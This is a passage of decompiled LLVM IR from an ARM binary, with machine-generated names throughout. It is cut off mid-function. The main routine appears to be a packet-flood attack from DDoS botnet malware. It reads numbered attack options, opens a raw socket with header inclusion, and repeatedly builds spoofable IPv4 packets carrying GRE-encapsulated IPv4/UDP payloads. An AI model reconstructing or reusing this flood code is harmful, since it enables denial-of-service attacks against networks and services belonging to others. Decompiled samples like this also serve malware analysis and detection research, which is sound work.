  %v5_9338 = inttoptr i32 %v4_9338 to i16*
  store i16 %v1_9334, i16* %v5_9338, align 2
  store i32 %v3_9040, i32* %r0.global-to-local, align 4
  %v1_9340 = load i32, i32* @r4, align 4
  %v9_9340 = icmp eq i32 %v3_9040, %v1_9340
  store i1 %v9_9340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9340, label %dec_label_pc_9348, label %dec_label_pc_9208

dec_label_pc_9348:                                ; preds = %dec_label_pc_9334, %dec_label_pc_91fc
  %v0_9348 = call i32 @function_e0d0()
  %v1_9348 = trunc i32 %v0_9348 to i16
  store i32 %v0_9348, i32* %r0.global-to-local, align 4
  store i32 %v3_9058, i32* %r1.global-to-local, align 4
  %v1_9350 = load i32, i32* @r4, align 4
  %v9_9350 = icmp eq i32 %v3_9058, %v1_9350
  store i1 %v9_9350, i1* %cpsr_z.global-to-local, align 1
  %v3_9354 = load i32, i32* @r5, align 4
  %v4_9354 = add i32 %v3_9354, 20
  %v5_9354 = inttoptr i32 %v4_9354 to i16*
  store i16 %v1_9348, i16* %v5_9354, align 2
  br i1 %v9_9350, label %dec_label_pc_935c, label %dec_label_pc_9214

dec_label_pc_935c:                                ; preds = %dec_label_pc_9348, %dec_label_pc_9208
  %v0_935c = call i32 @function_e0d0()
  %v1_935c = trunc i32 %v0_935c to i16
  store i32 %v0_935c, i32* %r0.global-to-local, align 4
  store i32 %v1_8fbc, i32* %r3.global-to-local, align 4
  store i1 %v2_9364, i1* %cpsr_z.global-to-local, align 1
  %v3_9368 = load i32, i32* @r6, align 4
  %v4_9368 = add i32 %v3_9368, 2
  %v5_9368 = inttoptr i32 %v4_9368 to i16*
  store i16 %v1_935c, i16* %v5_9368, align 2
  br i1 %v2_9364, label %dec_label_pc_9220, label %dec_label_pc_9370

dec_label_pc_9370:                                ; preds = %dec_label_pc_9214, %dec_label_pc_935c
  %v0_9370 = load i32, i32* @r5, align 4
  %v1_9370 = add i32 %v0_9370, 28
  store i32 %v1_9370, i32* %r0.global-to-local, align 4
  store i32 %v0_9088, i32* %r1.global-to-local, align 4
  %v2_9378 = inttoptr i32 %v1_9370 to i16*
  %v3_9378 = call i32 @function_e264(i16* %v2_9378, i32 %v0_9088)
  store i32 %v3_9378, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9220

dec_label_pc_9380:                                ; preds = %dec_label_pc_8ff4
  %v0_9380 = load i32, i32* @fp, align 4
  store i32 %v0_9380, i32* %r0.global-to-local, align 4
  %v1_9384 = call i32 @function_1130c(i32 %v0_9380)
  store i32 %v1_9384, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9388

dec_label_pc_9388:                                ; preds = %dec_label_pc_8eac, %dec_label_pc_9380
  %v1_9390 = phi i32 [ %v3_8fe4, %dec_label_pc_8eac ], [ %v1_9384, %dec_label_pc_9380 ]
  store i32 %v18_8eac, i32* %sb.global-to-local, align 4
  store i32 %v27_8eac, i32* %lr.global-to-local, align 4
  ret i32 %v1_9390

; uselistorder directives
  uselistorder i32 %v0_935c, { 1, 0 }
  uselistorder i32 %v0_9348, { 1, 0 }
  uselistorder i32 %v1_9340, { 1, 0 }
  uselistorder i32 %v3_92b8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_9294, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_9260, { 1, 0 }
  uselistorder i32 %v4_9250, { 1, 0 }
  uselistorder i1 %v2_9364, { 2, 3, 1, 0 }
  uselistorder i1 %v3_9328, { 3, 2, 0, 1 }
  uselistorder i32 %v3_90d4, { 1, 0 }
  uselistorder i16 %rev, { 1, 0 }
  uselistorder i32 %v3_90bc, { 1, 0 }
  uselistorder i32 %v1_908c, { 1, 0, 2 }
  uselistorder i32 %v1_9088, { 1, 0, 2 }
  uselistorder i32 %v3_9060, { 2, 1, 0, 3 }
  uselistorder i32 %v0_9048, { 1, 0, 2, 3 }
  uselistorder i32 %v3_9040, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 %v0_9038, { 1, 0, 2 }
  uselistorder i32 %v0_9088, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32 %v3_9028, { 3, 1, 2, 0 }
  uselistorder i1 %v7_9014, { 1, 0 }
  uselistorder i1 %v7_8fe8, { 1, 0 }
  uselistorder i32 %v3_8fe4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_8fd0, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_8fbc, { 2, 1, 3, 0 }
  uselistorder i32 %v1_8f48, { 1, 0 }
  uselistorder i32 %v1_8f24, { 1, 0 }
  uselistorder i32 %v6_8f1c, { 1, 0 }
  uselistorder i32 %v7_8f04, { 1, 0, 2, 3 }
  uselistorder i8 %v5_8f00, { 1, 0 }
  uselistorder i32 %v6_8ee0, { 1, 0 }
  uselistorder i32 %v2_8ec8, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 25, 24, 26, 27, 29, 28, 31, 30, 0 }
  uselistorder i32* %r0.global-to-local, { 46, 2, 4, 3, 6, 7, 5, 9, 8, 11, 10, 12, 1, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 33, 29, 30, 31, 32, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9388, { 1, 0 }
  uselistorder label %dec_label_pc_9370, { 1, 0 }
  uselistorder label %dec_label_pc_9220, { 2, 1, 0 }
  uselistorder label %dec_label_pc_91b4, { 1, 0 }
  uselistorder label %dec_label_pc_91a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_91a4.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
}

define i32 @function_9398(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9398:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_9398 = load i32, i32* @r4, align 4
  %v6_9398 = load i32, i32* @r5, align 4
  %v24_9398 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_93b4 = call i32 @function_12654(i32 %arg1, i32 4)
  %v0_93b8 = load i32, i32* @r5, align 4
  store i32 %v0_93b8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_93c8 = load i32, i32* @r4, align 4
  store i32 %v0_93c8, i32* %r0.global-to-local, align 4
  %v5_93cc = inttoptr i32 %v0_93b8 to i32*
  %v6_93cc = call i32 @function_8570(i32 %v0_93c8, i32* %v5_93cc, i32 2, i32 0)
  %v1_93d8 = urem i32 %v6_93cc, 256
  store i32 %v1_93d8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_93e4 = load i32, i32* @r5, align 4
  store i32 %v0_93e4, i32* %r1.global-to-local, align 4
  %v0_93e8 = load i32, i32* @r4, align 4
  store i32 %v0_93e8, i32* %r0.global-to-local, align 4
  %v5_93ec = trunc i32 %v6_93cc to i8
  %v6_93f0 = inttoptr i32 %v0_93e4 to i32*
  %v7_93f0 = call i32 @function_8570(i32 %v0_93e8, i32* %v6_93f0, i32 3, i32 65535)
  %v0_93f4 = load i32, i32* @r5, align 4
  store i32 %v0_93f4, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_93f0, i32* %fp.global-to-local, align 4
  %v0_9404 = load i32, i32* @r4, align 4
  store i32 %v0_9404, i32* %r0.global-to-local, align 4
  %v4_9408 = inttoptr i32 %v0_93f4 to i32*
  %v5_9408 = call i32 @function_8570(i32 %v0_9404, i32* %v4_9408, i32 4, i32 64)
  %v1_9410 = urem i32 %v5_9408, 256
  store i32 %v1_9410, i32* %ip.global-to-local, align 4
  %v0_9414 = load i32, i32* @r5, align 4
  store i32 %v0_9414, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9420 = load i32, i32* @r4, align 4
  store i32 %v0_9420, i32* %r0.global-to-local, align 4
  %v6_9428 = inttoptr i32 %v0_9414 to i32*
  %v7_9428 = call i32 @function_8570(i32 %v0_9420, i32* %v6_9428, i32 5, i32 1)
  %v1_9434 = urem i32 %v7_9428, 256
  store i32 %v1_9434, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9440 = load i32, i32* @r5, align 4
  store i32 %v0_9440, i32* %r1.global-to-local, align 4
  %v0_9444 = load i32, i32* @r4, align 4
  store i32 %v0_9444, i32* %r0.global-to-local, align 4
  %v5_944c = inttoptr i32 %v0_9440 to i32*
  %v6_944c = call i32 @function_8570(i32 %v0_9444, i32* %v5_944c, i32 6, i32 65535)
  %v0_9454 = load i32, i32* @r5, align 4
  store i32 %v0_9454, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_944c, i32* @r8, align 4
  %v0_9464 = load i32, i32* @r4, align 4
  store i32 %v0_9464, i32* %r0.global-to-local, align 4
  %v4_9468 = inttoptr i32 %v0_9454 to i32*
  %v5_9468 = call i32 @function_8570(i32 %v0_9464, i32* %v4_9468, i32 7, i32 65535)
  %v0_946c = load i32, i32* @r5, align 4
  store i32 %v0_946c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_9468, i32* @r7, align 4
  %v0_947c = load i32, i32* @r4, align 4
  store i32 %v0_947c, i32* %r0.global-to-local, align 4
  %v4_9480 = inttoptr i32 %v0_946c to i32*
  %v5_9480 = call i32 @function_8570(i32 %v0_947c, i32* %v4_9480, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9490 = load i32, i32* @r5, align 4
  store i32 %v0_9490, i32* %r1.global-to-local, align 4
  %v0_9494 = load i32, i32* @r4, align 4
  store i32 %v0_9494, i32* %r0.global-to-local, align 4
  %v4_9498 = inttoptr i32 %v0_9490 to i32*
  %v5_9498 = call i32 @function_8570(i32 %v0_9494, i32* %v4_9498, i32 1, i32 1)
  %v1_94a0 = urem i32 %v5_9498, 256
  store i32 %v1_94a0, i32* %ip.global-to-local, align 4
  %v0_94a4 = load i32, i32* @r5, align 4
  store i32 %v0_94a4, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_94b0 = load i32, i32* @r4, align 4
  store i32 %v0_94b0, i32* %r0.global-to-local, align 4
  %v5_94b8 = inttoptr i32 %v0_94a4 to i32*
  %v6_94b8 = call i32 @function_8570(i32 %v0_94b0, i32* %v5_94b8, i32 19, i32 0)
  %v0_94c0 = load i32, i32* @r5, align 4
  store i32 %v0_94c0, i32* %r1.global-to-local, align 4
  %v2_94c4 = load i32, i32* @global_var_212d8.45, align 4
  store i32 %v2_94c4, i32* %r3.global-to-local, align 4
  store i32 %v6_94b8, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_94d0 = load i32, i32* @r4, align 4
  store i32 %v0_94d0, i32* %r0.global-to-local, align 4
  %v4_94d4 = inttoptr i32 %v0_94c0 to i32*
  %v5_94d4 = call i32 @function_8570(i32 %v0_94d0, i32* %v4_94d4, i32 25, i32 %v2_94c4)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_94e8 = call i32 @function_11aec(i32 2, i32 3, i32 6)
  store i32 %v3_94e8, i32* %r0.global-to-local, align 4
  %v7_94ec = icmp eq i32 %v3_94e8, -1
  store i1 %v7_94ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_94ec, label %dec_label_pc_9a00, label %dec_label_pc_94f8

dec_label_pc_94f8:                                ; preds = %dec_label_pc_9398
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9500 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9500, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9514 = call i32 @function_11aa8(i32 %v3_94e8, i32 0, i32 3, i32 %v6_9500, i32 4)
  store i32 %v5_9514, i32* %r0.global-to-local, align 4
  %v7_9518 = icmp eq i32 %v5_9514, -1
  store i1 %v7_9518, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9518, label %dec_label_pc_99f8, label %dec_label_pc_9520

dec_label_pc_9520:                                ; preds = %dec_label_pc_94f8
  %v0_9520 = load i32, i32* @r8, align 4
  %v0_9524 = load i32, i32* @r7, align 4
  %v0_9528 = load i32, i32* %fp.global-to-local, align 4
  %v0_952c = load i32, i32* @r6, align 4
  %v1_952c = urem i32 %v0_952c, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9534 = urem i32 %v0_9520, 65536
  store i32 %v3_9534, i32* %r3.global-to-local, align 4
  %v3_9538 = urem i32 %v0_9524, 65536
  store i32 %v3_9538, i32* %r4.global-to-local, align 4
  %v0_953c = load i32, i32* @sl, align 4
  %v2_953c = icmp eq i32 %v0_953c, 0
  store i1 %v2_953c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9554 = urem i32 %v0_9528, 65536
  store i32 %v3_9554, i32* @fp, align 4
  br i1 %v2_953c, label %dec_label_pc_9a0c, label %dec_label_pc_9564

dec_label_pc_9564:                                ; preds = %dec_label_pc_9520
  %v3_9524 = mul i32 %v0_9524, 65536
  %v3_9520 = mul i32 %v0_9520, 65536
  %v0_9528.not = or i32 %v0_9528, -65536
  %v1_9568 = xor i32 %v0_9528.not, 65535
  %v3_956c = mul i32 %v5_9480, 65536
  %v1_9570 = add i32 %v3_956c, 4325376
  %tmp73 = udiv i32 %v1_9570, 256
  %v3_9584 = and i32 %tmp73, 65280
  %tmp74 = mul nsw i32 %v1_9568, 256
  %v3_9588 = and i32 %tmp74, 65280
  store i32 %v3_9588, i32* %ip.global-to-local, align 4
  %v1_958c = add i32 %v3_956c, 524288
  %v1_9594 = add i32 %v3_956c, 1835008
  %tmp75 = udiv i32 %v1_9568, 256
  %v4_9598 = urem i32 %tmp75, 256
  %v5_9598 = or i32 %v4_9598, %v3_9588
  %v4_95a0 = udiv i32 %v1_9570, 16777216
  %v5_95a0 = or i32 %v3_9584, %v4_95a0
  store i32 %v5_95a0, i32* @r8, align 4
  %v3_95ac = udiv i32 %v1_9594, 256
  %tmp76 = mul i32 %v0_9528, 256
  %v3_95b0 = and i32 %tmp76, 65280
  store i32 %v3_9520, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_9528, 256
  %v4_95c0 = urem i32 %tmp77, 256
  %v5_95c0 = or i32 %v4_95c0, %v3_95b0
  store i32 %v5_95c0, i32* %r0.global-to-local, align 4
  %tmp78 = mul i32 %v0_9520, 256
  %v3_95c4 = and i32 %tmp78, 65280
  %v1_95c8 = and i32 %v3_95ac, 65280
  store i32 %v1_95c8, i32* @r6, align 4
  store i32 %v3_9524, i32* %r1.global-to-local, align 4
  %tmp79 = mul i32 %v0_9524, 256
  %v3_95d4 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v0_9520, 256
  %v4_95d8 = urem i32 %tmp80, 256
  %v5_95d8 = or i32 %v4_95d8, %v3_95c4
  store i32 %v5_95d8, i32* @lr, align 4
  %v4_95dc = udiv i32 %v1_9594, 16777216
  %v5_95dc = or i32 %v1_95c8, %v4_95dc
  store i32 %v5_95dc, i32* %r3.global-to-local, align 4
  %tmp81 = udiv i32 %v0_9524, 256
  %v4_95e0 = urem i32 %tmp81, 256
  %v5_95e0 = or i32 %v4_95e0, %v3_95d4
  %tmp82 = udiv i32 %v1_958c, 256
  %v3_95e4 = and i32 %tmp82, 65280
  store i32 %v3_95e4, i32* @r5, align 4
  %v5_95e8 = trunc i32 %v5_95c0 to i16
  %v5_95f0 = trunc i32 %v5_95dc to i16
  %v4_95f8 = udiv i32 %v1_958c, 16777216
  %v5_95f8 = or i32 %v3_95e4, %v4_95f8
  store i32 %v5_95f8, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_9654 = sext i8 %v5_93ec to i32
  %v1_9660 = trunc i32 %v5_9408 to i8
  %sext = mul nuw i32 %v5_9598, 65536
  %v4_96ec = sdiv i32 %sext, 65536
  %v2_9718 = icmp eq i32 %v1_952c, 0
  %sext8 = mul nuw i32 %v5_95d8, 65536
  %v4_9738 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_95e0, 65536
  %v4_9740 = sdiv i32 %sext9, 65536
  %v1_96f827 = trunc i32 %v4_96ec to i16
  br label %dec_label_pc_9600

dec_label_pc_9600:                                ; preds = %bb85, %dec_label_pc_9564
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_960c = call i32 @function_12654(i32 1510, i32 4)
  store i32 %v2_960c, i32* %r0.global-to-local, align 4
  %v2_9614 = load i32, i32* @r4, align 4
  %v5_9614 = mul i32 %v2_9614, 4
  %v6_9614 = add i32 %v5_9614, %v2_93b4
  %v7_9614 = inttoptr i32 %v6_9614 to i32*
  store i32 %v2_960c, i32* %v7_9614, align 4
  %v3_9618 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9618, i32* %r2.global-to-local, align 4
  %v5_9620 = mul i32 %v3_9618, 24
  %v1_9624 = load i32, i32* @sb, align 4
  %v2_9624 = add i32 %v1_9624, %v5_9620
  store i32 %v2_9624, i32* @lr, align 4
  store i32 %v2_93b4, i32* %r3.global-to-local, align 4
  %v4_962c = mul i32 %v3_9618, 4
  %v5_962c = add i32 %v4_962c, %v2_93b4
  %v6_962c = inttoptr i32 %v5_962c to i32*
  %v7_962c = load i32, i32* %v6_962c, align 4
  store i32 %v7_962c, i32* %r4.global-to-local, align 4
  %v1_9630 = inttoptr i32 %v7_962c to i8*
  %v2_9630 = load i8, i8* %v1_9630, align 1
  %tmp = urem i8 %v2_9630, 16
  %v1_9634 = zext i8 %tmp to i32
  %v1_9638 = or i32 %v1_9634, 64
  store i32 %v1_9638, i32* %r3.global-to-local, align 4
  %v1_963c = trunc i32 %v1_9638 to i8
  store i8 %v1_963c, i8* %v1_9630, align 1
  %v0_9640 = load i32, i32* %r4.global-to-local, align 4
  %v1_9640 = inttoptr i32 %v0_9640 to i8*
  %v2_9640 = load i8, i8* %v1_9640, align 1
  %v1_9644 = and i8 %v2_9640, -16
  %v1_9648 = or i8 %v1_9644, 5
  store i32 %v1_9434, i32* %r5.global-to-local, align 4
  store i8 %v1_9648, i8* %v1_9640, align 1
  store i32 %v4_9654, i32* %r1.global-to-local, align 4
  %v2_9658 = load i32, i32* %r4.global-to-local, align 4
  %v3_9658 = add i32 %v2_9658, 1
  %v4_9658 = inttoptr i32 %v3_9658 to i8*
  store i8 %v5_93ec, i8* %v4_9658, align 1
  store i32 %v1_9410, i32* %r2.global-to-local, align 4
  %v2_9660 = load i32, i32* %r4.global-to-local, align 4
  %v3_9660 = add i32 %v2_9660, 8
  %v4_9660 = inttoptr i32 %v3_9660 to i8*
  store i8 %v1_9660, i8* %v4_9660, align 1
  %v2_9668 = load i32, i32* %r4.global-to-local, align 4
  %v3_9668 = add i32 %v2_9668, 4
  %v4_9668 = inttoptr i32 %v3_9668 to i16*
  store i16 %v5_95e8, i16* %v4_9668, align 2
  %v2_9670 = load i32, i32* %r4.global-to-local, align 4
  %v3_9670 = add i32 %v2_9670, 9
  %v4_9670 = inttoptr i32 %v3_9670 to i8*
  store i8 47, i8* %v4_9670, align 1
  store i32 %v5_94d4, i32* %r3.global-to-local, align 4
  %v0_9678 = load i32, i32* %r5.global-to-local, align 4
  %v2_9678 = icmp eq i32 %v0_9678, 0
  store i1 %v2_9678, i1* %cpsr_z.global-to-local, align 1
  %v1_967c = load i32, i32* %r4.global-to-local, align 4
  %v2_967c = add i32 %v1_967c, 12
  %v3_967c = inttoptr i32 %v2_967c to i32*
  store i32 %v5_94d4, i32* %v3_967c, align 4
  br i1 %v2_9678, label %.thread25, label %bb

bb:                                               ; preds = %dec_label_pc_9600
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_9684 = load i32, i32* %r4.global-to-local, align 4
  %v4_9684 = add i32 %v3_9684, 6
  %v5_9684 = inttoptr i32 %v4_9684 to i16*
  store i16 64, i16* %v5_9684, align 2
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_9600, %bb
  %v0_9688 = load i32, i32* @lr, align 4
  %v1_9688 = add i32 %v0_9688, 16
  %v2_9688 = inttoptr i32 %v1_9688 to i32*
  %v3_9688 = load i32, i32* %v2_9688, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_9690 = load i32, i32* %r4.global-to-local, align 4
  %v2_9690 = add i32 %v1_9690, 16
  %v3_9690 = inttoptr i32 %v2_9690 to i32*
  store i32 %v3_9688, i32* %v3_9690, align 4
  %v0_9694 = load i32, i32* %r4.global-to-local, align 4
  %v1_9694 = add i32 %v0_9694, 24
  store i32 %v1_9694, i32* %r1.global-to-local, align 4
  %v1_9698 = add i32 %v0_9694, 20
  store i32 %v1_9698, i32* %r0.global-to-local, align 4
  %v0_969c = load i32, i32* %ip.global-to-local, align 4
  %v1_969c = add i32 %v0_969c, 101
  store i32 %v1_969c, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_96a8 = load i32, i32* @r8, align 4
  %v1_96a8 = trunc i32 %v0_96a8 to i16
  %v3_96a8 = add i32 %v0_9694, 2
  %v4_96a8 = inttoptr i32 %v3_96a8 to i16*
  store i16 %v1_96a8, i16* %v4_96a8, align 2
  %v0_96ac = load i32, i32* %ip.global-to-local, align 4
  %v1_96ac = trunc i32 %v0_96ac to i16
  %v2_96ac = load i32, i32* %r0.global-to-local, align 4
  %v3_96ac = add i32 %v2_96ac, 2
  %v4_96ac = inttoptr i32 %v3_96ac to i16*
  store i16 %v1_96ac, i16* %v4_96ac, align 2
  %v0_96b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_96b0 = trunc i32 %v0_96b0 to i8
  %v2_96b0 = load i32, i32* %r1.global-to-local, align 4
  %v3_96b0 = add i32 %v2_96b0, 13
  %v4_96b0 = inttoptr i32 %v3_96b0 to i8*
  store i8 %v1_96b0, i8* %v4_96b0, align 1
  %v0_96b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_96b4 = trunc i32 %v0_96b4 to i8
  %v2_96b4 = load i32, i32* %r1.global-to-local, align 4
  %v3_96b4 = add i32 %v2_96b4, 12
  %v4_96b4 = inttoptr i32 %v3_96b4 to i8*
  store i8 %v1_96b4, i8* %v4_96b4, align 1
  %v0_96b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_96b8 = add i32 %v0_96b8, 38
  %v2_96b8 = inttoptr i32 %v1_96b8 to i8*
  %v3_96b8 = load i8, i8* %v2_96b8, align 1
  %tmp89 = urem i8 %v3_96b8, 16
  %v1_96bc = zext i8 %tmp89 to i32
  %v1_96c0 = or i32 %v1_96bc, 64
  store i32 %v1_96c0, i32* %r3.global-to-local, align 4
  %v1_96c4 = trunc i32 %v1_96c0 to i8
  store i8 %v1_96c4, i8* %v2_96b8, align 1
  %v0_96c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_96c8 = add i32 %v0_96c8, 38
  %v2_96c8 = inttoptr i32 %v1_96c8 to i8*
  %v3_96c8 = load i8, i8* %v2_96c8, align 1
  %v1_96cc = and i8 %v3_96c8, -16
  %v1_96d0 = or i8 %v1_96cc, 5
  store i8 %v1_96d0, i8* %v2_96c8, align 1
  %v0_96dc = load i32, i32* %r4.global-to-local, align 4
  %v1_96dc = add i32 %v0_96dc, 38
  store i32 %v1_96dc, i32* @r5, align 4
  %v3_96e0 = add i32 %v0_96dc, 39
  %v4_96e0 = inttoptr i32 %v3_96e0 to i8*
  store i8 %v5_93ec, i8* %v4_96e0, align 1
  store i32 %v5_95dc, i32* %r2.global-to-local, align 4
  %v2_96e8 = load i32, i32* @r5, align 4
  %v3_96e8 = add i32 %v2_96e8, 2
  %v4_96e8 = inttoptr i32 %v3_96e8 to i16*
  store i16 %v5_95f0, i16* %v4_96e8, align 2
  store i32 %v4_96ec, i32* %r3.global-to-local, align 4
  store i32 %v1_9410, i32* %r1.global-to-local, align 4
  %v0_96f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_96f4, label %.thread26, label %bb83

.thread26:                                        ; preds = %.thread25
  %v2_96f828 = load i32, i32* @r5, align 4
  %v3_96f829 = add i32 %v2_96f828, 4
  %v4_96f830 = inttoptr i32 %v3_96f829 to i16*
  store i16 %v1_96f827, i16* %v4_96f830, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %.thread25
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_96f8 = load i32, i32* @r5, align 4
  %v3_96f8 = add i32 %v2_96f8, 4
  %v4_96f8 = inttoptr i32 %v3_96f8 to i16*
  store i16 %v1_96f827, i16* %v4_96f8, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  %v1_9700 = load i32, i32* %r2.global-to-local, align 4
  %v2_9700 = trunc i32 %v1_9700 to i16
  %v3_9700 = load i32, i32* @r5, align 4
  %v4_9700 = add i32 %v3_9700, 6
  %v5_9700 = inttoptr i32 %v4_9700 to i16*
  store i16 %v2_9700, i16* %v5_9700, align 2
  br label %bb84

bb84:                                             ; preds = %.thread26, %bb83
  %v0_9704 = load i32, i32* %r1.global-to-local, align 4
  %v1_9704 = trunc i32 %v0_9704 to i8
  %v2_9704 = load i32, i32* @r5, align 4
  %v3_9704 = add i32 %v2_9704, 8
  %v4_9704 = inttoptr i32 %v3_9704 to i8*
  store i8 %v1_9704, i8* %v4_9704, align 1
  %v0_9708 = load i32, i32* %r3.global-to-local, align 4
  %v1_9708 = trunc i32 %v0_9708 to i8
  %v2_9708 = load i32, i32* @r5, align 4
  %v3_9708 = add i32 %v2_9708, 9
  %v4_9708 = inttoptr i32 %v3_9708 to i8*
  store i8 %v1_9708, i8* %v4_9708, align 1
  %v0_970c = call i32 @function_e0d0()
  store i32 %v0_970c, i32* %r0.global-to-local, align 4
  store i32 %v1_952c, i32* %r1.global-to-local, align 4
  store i1 %v2_9718, i1* %cpsr_z.global-to-local, align 1
  %v1_971c = sub i32 1023, %v0_970c
  store i32 %v1_971c, i32* %r3.global-to-local, align 4
  br i1 %v2_9718, label %.thread, label %.thread10

.thread:                                          ; preds = %bb84
  %v2_9724 = load i32, i32* @r5, align 4
  %v3_9724 = add i32 %v2_9724, 16
  %v4_9724 = inttoptr i32 %v3_9724 to i32*
  store i32 %v1_971c, i32* %v4_9724, align 4
  br label %bb85

.thread10:                                        ; preds = %bb84
  %v1_9720 = load i32, i32* %r4.global-to-local, align 4
  %v2_9720 = add i32 %v1_9720, 16
  %v3_9720 = inttoptr i32 %v2_9720 to i32*
  %v4_9720 = load i32, i32* %v3_9720, align 4
  store i32 %v4_9720, i32* %r3.global-to-local, align 4
  %v2_9728 = load i32, i32* @r5, align 4
  %v3_9728 = add i32 %v2_9728, 16
  %v4_9728 = inttoptr i32 %v3_9728 to i32*
  store i32 %v4_9720, i32* %v4_9728, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %.thread10
  %v1_972c = load i32, i32* @r5, align 4
  %v2_972c = add i32 %v1_972c, 12
  %v3_972c = inttoptr i32 %v2_972c to i32*
  store i32 %v0_970c, i32* %v3_972c, align 4
  %v3_9730 = load i32, i32* %stack_var_-44, align 4
